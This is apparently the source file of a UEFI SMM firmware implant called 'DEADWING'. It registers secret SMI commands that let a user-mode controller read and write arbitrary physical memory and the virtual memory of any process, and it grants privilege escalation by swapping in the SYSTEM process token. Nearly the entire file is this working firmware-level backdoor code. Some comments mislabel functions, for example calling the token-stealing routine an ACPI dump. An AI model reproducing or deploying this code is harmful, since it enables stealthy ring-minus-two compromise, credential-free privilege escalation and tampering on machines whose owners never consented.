#include <Uefi.h>

#include <Library/UefiLib.h>
#include <Library/BaseLib.h>

#include <IndustryStandard/Acpi.h>

#include "Globals.h"
#include "Defs.h"
#include "Utils.h"
#include "Serial.h"
#include "Memory.h"
#include "Nt.h"

#define CMD_DEADWING_PING_SMI             0xD700DEADULL
#define CMD_DEADWING_READ_PHYS            0xD800AAABULL
#define CMD_DEADWING_WRITE_PHYS           0xD800BBCDULL
#define CMD_DEADWING_VIRT_TO_PHYS         0xD800FF11ULL
#define CMD_DEADWING_READ_VIRTUAL         0xD900CCEFULL
#define CMD_DEADWING_WRITE_VIRTUAL        0xD900DDAFULL
#define CMD_DEADWING_PRIV_ESC             0xD100AC91ULL
#define CMD_DEADWING_CACHE_SESSION_INFO   0xD110A110ULL

DEADWING_LIVE_SESSION_INFO gLiveSession;


/**
 * \brief Reads data from specified physical address
 * 
 * \param AddressToRead Provided physical address
 * \param LengthToRead  Length to read from specified address
 * \param ReceivedInfo  Received data (virtual buffer)
 * 
 * \return EFI_SUCCESS - Operation was performed succesfully
 * \return EFI_INVALID_PARAMETER - One or more arguments are invalid
 * \return EFI_ABORTED - Unable to translate or map address
 * \return Other - Ynable to allocate interim page
 */
EFI_STATUS
EFIAPI
CmdPhysRead(
	IN VOID   *AddressToRead,
	IN VOID   *ReceivedInfo,
	IN UINT64  LengthToRead
) {
	SerialPrint("[ SMM ] Reading from physical memory\r\n");

	// validate input
	if((!AddressToRead || !LengthToRead || !ReceivedInfo) || LengthToRead > BASE_4KB) {
		SerialPrint("[ SMM ] Invalid parameters has been passed to specific command\r\n");
		return EFI_INVALID_PARAMETER;
	}

	// allocate intermediate page for storing data from read address
	EFI_PHYSICAL_ADDRESS InterimPage;
	EFI_STATUS Status = gSmst2->SmmAllocatePages(AllocateAnyPages, EfiRuntimeServicesData, 1, &InterimPage);
	if(EFI_ERROR(Status)) {
		SerialPrint("[ SMM ] Unable to allocate intermediate page\r\n");
		return Status;
	}

	// map physical address to the SMRAM
	UINT64 PhysMapped = MemProcessOutsideSmramPhysMemory(AddressToRead);
	if(PhysMapped != 0) {
		// copy data to intermediate page
		PhysMemCpy(InterimPage, PhysMapped, LengthToRead);

		MemRestoreSmramMappings();

		// map consumer address
		UINT64 Consumer = MemMapVirtualAddress(ReceivedInfo, gLiveSession.UmController.UmControllerDirBase, NULL);
		if(Consumer == 0) {
			SerialPrint("[ SMM ] Unable to map consumer buffer\r\n");
			gSmst2->SmmFreePages(InterimPage, 1);
			return EFI_ABORTED;
		}

		// copy data to the consumer buffer & map it back
		PhysMemCpy(Consumer, InterimPage, LengthToRead);

		MemRestoreSmramMappings();
	} else {
		SerialPrint("[ SMM ] Unable to map physical address\r\n");
		gSmst2->SmmFreePages(InterimPage, 1);
		return EFI_ABORTED;
	}

	gSmst2->SmmFreePages(InterimPage, 1);

	return EFI_SUCCESS;
}

/**
 * \brief Writes data to provided physical address
 * 
 * \param AddressToWrite Provided physical address which should
 *                       be modified
 * \param DataToWrite    Provided data which should be written to
 *                       specified physical address (virtual buffer)
 * \param LengthToWrite  Size of data
 * 
 * \return EFI_SUCCESS - Operation was performed succesfully
 * \return EFI_INVALID_PARAMETER - One or more arguments are invalid
 * \return EFI_ABORTED - Unable to translate or map address
 * \return Other - Ynable to allocate interim page
 */
EFI_STATUS
EFIAPI
CmdPhysWrite(
	IN VOID    *AddressToWrite,
	IN VOID    *DataToWrite,
	IN UINT64   LengthToWrite 
) {
	SerialPrint("[ SMM ] Writing to the physical memory\r\n");

	// validate input
	if((!AddressToWrite || !DataToWrite || !LengthToWrite) || LengthToWrite > BASE_4KB) {
		SerialPrint("[ SMM ] Invalid parameters has been passed to specific command\r\n");
		return EFI_INVALID_PARAMETER;
	}

	// allocate intermediate page for storing data from read address
	EFI_PHYSICAL_ADDRESS InterimPage;
	EFI_STATUS Status = gSmst2->SmmAllocatePages(AllocateAnyPages, EfiRuntimeServicesData, 1, &InterimPage);
	if(EFI_ERROR(Status)) {
		SerialPrint("[ SMM ] Unable to allocate intermediate page\r\n");
		return Status;
	}

	UINT64 Donor = MemMapVirtualAddress(DataToWrite, gLiveSession.UmController.UmControllerDirBase, NULL);
	if(Donor != NULL) {
		// copy data to the intermediate page
		PhysMemCpy(InterimPage, Donor, LengthToWrite);

		MemRestoreSmramMappings();

		// map target physical memory to the SMRAM
		UINT64 PhysMapped = MemProcessOutsideSmramPhysMemory(AddressToWrite);
		if(PhysMapped == 0) {
			SerialPrint("[ SMM ] Unable to map physical memory to the SMRAM\r\n");
			gSmst2->SmmFreePages(InterimPage, 1);
			return EFI_ABORTED;
		}

		// copy data to the target address
		PhysMemCpy(PhysMapped, InterimPage, LengthToWrite);

		MemRestoreSmramMappings();
	} else {
		SerialPrint("[ SMM ] Unable to map donor buffer to the SMRAM\r\n");
		gSmst2->SmmFreePages(InterimPage, 1);
		return EFI_ABORTED;
	}

	gSmst2->SmmFreePages(InterimPage, 1);

	return EFI_SUCCESS;
}

/**
 * \brief Reads data from provided virtual address.
 * 
 * Function checks if paging enabled. If system can work with paging, we'll
 * translate provided virtual address to physical and read data from it.
 * 
 * \param TargetPid     PID of the target process
 * \param AddressToRead Virtual address which should be translated before
 *                      reading from it
 * \param LengthToRead  Length to read from provided address
 * \param ReceivedInfo  Received data
 * 
 * \return EFI_SUCCESS - Operation was performed succesfully
 * \return EFI_INVALID_PARAMETER - One or more arguments are invalid
 * \return EFI_ABORTED - Unable to translate and map virtual address to physical
 * \return EFI_NOT_FOUND - Cannot find dir base
 * \return Other - Ynable to allocate interim page
 */
EFI_STATUS
EFIAPI
CmdVirtualRead(
	IN UINT64   TargetPid,
	IN VOID    *AddressToRead,
	IN VOID    *ReceivedInfo,
	IN UINT64   LengthToRead
) {
	SerialPrint("[ SMM ] Reading from virtual memory\r\n");

	// validate input
	if((!AddressToRead || !LengthToRead || !ReceivedInfo) || LengthToRead > BASE_4KB || !TargetPid) {
		SerialPrint("[ SMM ] Invalid parameters has been passed to va read command\r\n");
		return EFI_INVALID_PARAMETER;
	}

	// allocate intermediate page for storing read address contents
	EFI_PHYSICAL_ADDRESS InterimPage;
	EFI_STATUS Status = gSmst2->SmmAllocatePages(AllocateAnyPages, EfiRuntimeServicesData, 1, &InterimPage);
	if(EFI_ERROR(Status)) {
		SerialPrint("[ SMM ] Unable to allocate itermediate page\r\n");
		return Status;
	}

	// map physical address of system EPROCESS into the SMRAM region
	UINT64 MappedEprocess = MemProcessOutsideSmramPhysMemory(gLiveSession.SysProcess.PhysPsInitialSysProcess, gRemapPage);
	if(MappedEprocess != 0) {
		// get target process dir base
		UINT64 TargetDirBase = NtGetDirBaseByPid(TargetPid, MappedEprocess, gLiveSession.SysProcess.DirBase, NULL);
		if(TargetDirBase == 0) {
			SerialPrint("[ SMM ] Unable to get target process dir base\r\n");
			gSmst2->SmmFreePages(InterimPage, 1);
			return EFI_NOT_FOUND;
		}

		// translate read address and copy its content to the intermediate page
		UINT64 TranslatedReadTarget = MemMapVirtualAddress(AddressToRead, TargetDirBase, NULL);
		if(TranslatedReadTarget == 0) {
			SerialPrint("[ SMM ] Unable to translate and map read address\r\n");
			gSmst2->SmmFreePages(InterimPage, 1);
			return EFI_ABORTED;
		}

		PhysMemCpy(InterimPage, TranslatedReadTarget, LengthToRead);

		// restore mappings
		MemRestoreSmramMappings();

		// translate consumer buffer
		UINT64 TranslatedConsumer = MemMapVirtualAddress(ReceivedInfo, gLiveSession.UmController.UmControllerDirBase, NULL);
		if(TranslatedConsumer == 0) {
			SerialPrint("[ SMM ] Unable to translate and map consumer address\r\n");
			gSmst2->SmmFreePages(InterimPage, 1);
			return EFI_ABORTED;
		}

		// copy data
		PhysMemCpy(TranslatedConsumer, InterimPage, LengthToRead);
		
		MemRestoreSmramMappings();
	} else {
		SerialPrint("[ SMM ] Unable to map system EPROCESS into SMRAM region\r\n");
		gSmst2->SmmFreePages(InterimPage, 1);
		return EFI_ABORTED;
	}

	gSmst2->SmmFreePages(InterimPage, 1);

	return EFI_SUCCESS;
}

/**
 * \brief Writes to provided virtual address.
 * 
 * Function checks if paging enabled. If system can work with paging, we'll translate
 * provided virtual address to physical and write data to it
 * 
 * \param TargetPid      PID of the target process
 * \param AddressToWrite Virtual address which should be translated and modified by 
 *                       provided data
 * \param DataToWrite    Data which should be written at specified address
 * \param LengthToWrite  Size of data
 * 
 * \return EFI_SUCCESS - Operation was performed succesfully
 * \return EFI_INVALID_PARAMETER - One or more arguments are invalid
 * \return EFI_ABORTED - Unable to translate and map virtual address to physical
 * \return EFI_NOT_FOUND - Cannot find dir base
 * \return Other - Ynable to allocate interim page
 */
EFI_STATUS
EFIAPI
CmdVirtualWrite(
	IN UINT64  TargetPid,
	IN VOID   *AddressToWrite,
	IN VOID   *DataToWrite,
	IN UINT64  LengthToWrite
) {
	SerialPrint("[ SMM ] Writing to the virtual memory\r\n");

	// validate input
	if((!AddressToWrite || !DataToWrite || !LengthToWrite) || LengthToWrite > BASE_4KB || !TargetPid) {
		SerialPrint("[ SMM ] Invalid parameters has been passed to specific command\r\n");
		return EFI_INVALID_PARAMETER;
	}

	// allocate intermediate page for storing donor buffer content
	EFI_PHYSICAL_ADDRESS InterimPage;
	EFI_STATUS Status = gSmst2->SmmAllocatePages(AllocateAnyPages, EfiRuntimeServicesData, 1, &InterimPage);
	if(EFI_ERROR(Status)) {
		SerialPrint("[ SMM ] Unable to allocate itermediate page\r\n");
		return Status;
	}

	UINT64 MappedEprocess = MemProcessOutsideSmramPhysMemory(gLiveSession.SysProcess.PhysPsInitialSysProcess, gRemapPage);
	if(MappedEprocess != NULL) {
		// get target process dir base
		UINT64 TargetDirBase = NtGetDirBaseByPid(TargetPid, MappedEprocess, gLiveSession.SysProcess.DirBase, NULL);
		if(TargetDirBase == 0) {
			SerialPrint("[ SMM ] Unable to get target process dir base\r\n");
			gSmst2->SmmFreePages(InterimPage, 1);
			return EFI_NOT_FOUND;
		}

		// translate donor buffer address and copy data to the intermediate page
		UINT64 TranslatedDataDonor = MemMapVirtualAddress(DataToWrite, gLiveSession.UmController.UmControllerDirBase, NULL);
		if(TranslatedDataDonor == 0) {
			SerialPrint("[ SMM ] Unable to translate donor buffer address\r\n");
			gSmst2->SmmFreePages(InterimPage, 1);
			return EFI_ABORTED;
		}

		PhysMemCpy(InterimPage, TranslatedDataDonor, LengthToWrite);

		// restore mappings
		MemRestoreSmramMappings();

		// translate target address
		UINT64 TranslatedWriteAddress = MemMapVirtualAddress(AddressToWrite, TargetDirBase, NULL);
		if(TranslatedWriteAddress == 0) {
			SerialPrint("[ SMM ] Unable to translate target write address\r\n");
			gSmst2->SmmFreePages(InterimPage, 1);
			return EFI_ABORTED;
		}

		// write data
		PhysMemCpy(TranslatedWriteAddress, InterimPage, LengthToWrite);
	
		MemRestoreSmramMappings();
	} else {
		SerialPrint("[ SMM ] Unable to map system EPROCESS into SMRAM region\r\n");
		gSmst2->SmmFreePages(InterimPage, 1);
		return EFI_ABORTED;
	}

	gSmst2->SmmFreePages(InterimPage, 1);

	return EFI_SUCCESS;
}

/**
 * \brief Caches current session - saves system & controller app EPROCESSes and Dir bases.
 * 
 * \param VirtualEprocess Virtual address of system's EPROCESS structure
 * \param DirBase         Directory table base of the kernel
 * 
 * \return EFI_SUCCESS - Data has been cached succesfully
 * \return EFI_INVALID_PARAMETER - EPROCESS address and/or Directory table base is NULL
 * \return EFI_ABORTED - Unable to translate EPROCESS address, find kernel base address or
 *                       cache export table
 */
EFI_STATUS
EFIAPI
CmdCacheSessionInfo(
	IN UINT64  ControllerPid,
	IN VOID   *VirtualEprocess,
	IN UINT64  DirBase
) {
	SerialPrint("[ SMM ] Trying to cache session info\r\n");

	if(!ControllerPid || !VirtualEprocess || !DirBase) {
		SerialPrint("[ SMM ] Invalid parameters has been passed to caching function\r\n");
		return EFI_INVALID_PARAMETER;
	}

	// translate address of PsInitialSystemProcess
	VOID *UmEprocess = NULL;
	UINT64 UmDirBase = 0;
	VOID *UnmappedSysEprocess = NULL;
	UINT64 PhysEprocess = MemMapVirtualAddress(VirtualEprocess, DirBase, &UnmappedSysEprocess);
	if(PhysEprocess != 0) {
		// get controller process dir base & EPROCESS
		UmDirBase = NtGetDirBaseByPid(ControllerPid, (VOID *)PhysEprocess, DirBase, &UmEprocess);
		if(UmDirBase == 0 || UmEprocess == 0) {
			SerialPrint("[ SMM ] Cannot get dir base of the controller UM application\r\n");
			return EFI_ABORTED;
		}
	} else {
		SerialPrint("[ SMM ] Unable to get physical address of PsInitialSystemProcess\r\n");
		return EFI_ABORTED; 
	}

	// cache all info
	gLiveSession.SysProcess.PhysPsInitialSysProcess = (VOID *)UnmappedSysEprocess;
	gLiveSession.SysProcess.DirBase = DirBase;
	gLiveSession.UmController.PhysUmControllerEprocess = (VOID *)UmEprocess;
	gLiveSession.UmController.UmControllerDirBase = UmDirBase;

	SerialPrint("[ SMM ] Session info has been cached\r\n");

	return EFI_SUCCESS;
}

/**
 * \brief Translates provided virtual address
 * 
 * \param TargetPid          PID of the target process
 * \param AddressToTranslate Address which should be translated
 * \param TranslatedAddress  Output translate address
 * 
 * \return EFI_SUCCESS - Operation was performed succesfully
 * \return EFI_INVALID_PARAMETER - One or more arguments are invalid
 * \return EFI_ABORTED - Unable to translate and map virtual address to physical
 * \return EFI_NOT_FOUND - Cannot find dir base
 */
EFI_STATUS
EFIAPI
CmdVirtToPhys(
	IN  UINT64   TargetPid,
	IN  VOID    *AddressToTranslate,
	OUT VOID   **TranslatedAddress
) {
	SerialPrint("[ SMM ] Translating virtual address to physical\r\n");

	if(!TargetPid || !AddressToTranslate) {
		SerialPrint("[ SMM ] Invalid parameters has been passed to the VTOP function\r\n");
		return EFI_INVALID_PARAMETER;
	}

	// map system EPROCESS
	UINT64 MappedEprocess = MemProcessOutsideSmramPhysMemory(gLiveSession.SysProcess.PhysPsInitialSysProcess, gRemapPage);
	if(MappedEprocess != 0) {
		// get dirbase of the target process
		UINT64 TargetDir = NtGetDirBaseByPid(TargetPid, MappedEprocess, gLiveSession.SysProcess.DirBase, NULL);
		if(TargetDir == 0) {
			SerialPrint("[ SMM ] Unable to get target process dirbase\r\n");
			return EFI_NOT_FOUND;
		}

		// just translate it
		UINT64 Phys = MemTranslateVirtualToPhys(AddressToTranslate, TargetDir);
		if(Phys == 0) {
			SerialPrint("[ SMM ] Unable to translate provided virtual address\r\n");
			return EFI_ABORTED;
		}

		*TranslatedAddress = Phys;

		MemRestoreSmramMappings();
	} else {
		SerialPrint("[ SMM ] Unable to map system EPROCESS into SMRAM region\r\n");
		return EFI_ABORTED;
	}

	return EFI_SUCCESS;
}

/**
 * \brief Dumps content of specific ACPI table
 * 
 * \param Signature     Signature of specific ACPI table
 * \param BufferAddress Output buffer
 * 
 * \return EFI_SUCCESS - Operation was performed succesfully
 * \return EFI_INVALID_PARAMETER - One or more arguments are invalid
 * \return EFI_ABORTED - Unable to translate and map virtual address to physical
 * \return EFI_ABORTED - Unable to find ACPI table or its length more than 4KB
 */
EFI_STATUS
EFIAPI
CmdEscalatePrivileges(
	VOID
) {
	SerialPrint("[ SMM ] Leveraging controller process\r\n");

	return NtExchageProcessToken(gLiveSession.SysProcess.PhysPsInitialSysProcess, gLiveSession.UmController.PhysUmControllerEprocess);
}

/**
 * \brief Main command handler
 * 
 * \param SmiCommCtx Communication buffer with data for SMI handler
 * 
 * \return EFI_SUCCESS - Command has been dispatched succesfully
 * \return Other - An error occured while command dispatching
 */
EFI_STATUS
EFIAPI
CmdMainHandler(
	IN PDEADWING_COMMUNICATION SmiCommCtx
) {
	EFI_STATUS Status;
	VOID *VtopMem = NULL;

	// dispatch request
	switch(SmiCommCtx->Command) {
		case CMD_DEADWING_PING_SMI:
			SerialPrint("[ SMM ] SMI handler is alive now\r\n");
			Status = EFI_SUCCESS;
		break;
		case CMD_DEADWING_READ_PHYS:
			Status = CmdPhysRead(SmiCommCtx->Read.PhysReadAddress, SmiCommCtx->Read.ReadResult, SmiCommCtx->Read.ReadLength);
			if(EFI_ERROR(Status))
				SerialPrint("[ SMM ] Unable to read from the physical memory\r\n");
		break;
		case CMD_DEADWING_WRITE_PHYS:
			Status = CmdPhysWrite(SmiCommCtx->Write.PhysWriteAddress, SmiCommCtx->Write.DataToWrite, SmiCommCtx->Write.WriteLength);
			if(EFI_ERROR(Status))
				SerialPrint("[ SMM ] Unable to write to the physical memory\r\n");
		break;
		case CMD_DEADWING_READ_VIRTUAL:
			Status = CmdVirtualRead(SmiCommCtx->Read.TargetProcessId, SmiCommCtx->Read.VaReadAddress, SmiCommCtx->Read.ReadResult, SmiCommCtx->Read.ReadLength);
			if(EFI_ERROR(Status))
				SerialPrint("[ SMM ] Cannot read from provided virtual address\r\n");
		break;
		case CMD_DEADWING_WRITE_VIRTUAL:
			Status = CmdVirtualWrite(SmiCommCtx->Write.TargetProcessId, SmiCommCtx->Write.VaWriteAddress, SmiCommCtx->Write.DataToWrite, SmiCommCtx->Write.WriteLength);
			if(EFI_ERROR(Status))
				SerialPrint("[ SMM ] Cannot write data to provided virtual address\r\n");
		break;
		case CMD_DEADWING_CACHE_SESSION_INFO:
			Status = CmdCacheSessionInfo(SmiCommCtx->Cache.ControllerProcessId, SmiCommCtx->Cache.VaPsInitialSysProcess, SmiCommCtx->Cache.DirBase);
			if(EFI_ERROR(Status))
				SerialPrint("[ SMM ] Unable to cache some kernel data\r\n");
		break;
		case CMD_DEADWING_VIRT_TO_PHYS:
			Status = CmdVirtToPhys(SmiCommCtx->Vtop.TargetPid, SmiCommCtx->Vtop.AddressToTranslate, &VtopMem);
			if(EFI_ERROR(Status))
				SerialPrint("[ SMM ] Unable to translate virtual address to physical\r\n");
			
			SmiCommCtx->Vtop.Translated = VtopMem;
		break;
		case CMD_DEADWING_PRIV_ESC:
			Status = CmdEscalatePrivileges();
			if(EFI_ERROR(Status))
				SerialPrint("[ SMM ] Unable to dump ACPI table\r\n");
		break;
		default:
			// handler received unknown command, skip it
			SerialPrint("[ SMM ] SMI handler received unknown command\r\n");
			Status = EFI_INVALID_PARAMETER;
		break;
	}

	return Status;
}
